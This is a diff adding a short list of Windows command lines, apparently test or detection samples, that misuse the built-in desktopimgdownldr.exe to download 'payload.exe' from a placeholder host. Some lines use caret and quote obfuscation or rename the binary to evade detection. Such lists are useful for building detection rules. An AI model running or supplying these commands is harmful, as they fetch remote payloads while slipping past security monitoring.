@@ -1,0 +1,5 @@
+cmd.exe /c "desktopimgdownldr.exe /lockscreenurl:h^t^t^p^:^/^/http://example.com/payload.exe"
+cmd.exe /c copy desktopimgdownldr.exe bg_update.exe && bg_update.exe /lockscreenurl:http://example.com/payload.exe
+copy desktopimgdownldr.exe dl.exe && dl.exe /lockscreenurl:http://example.com/test.txt /dest:%temp%\test.txt
+desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.exe
+desktopimgdownldr.exe /lockscreenurl:"h""ttp://example.com/payload.exe"
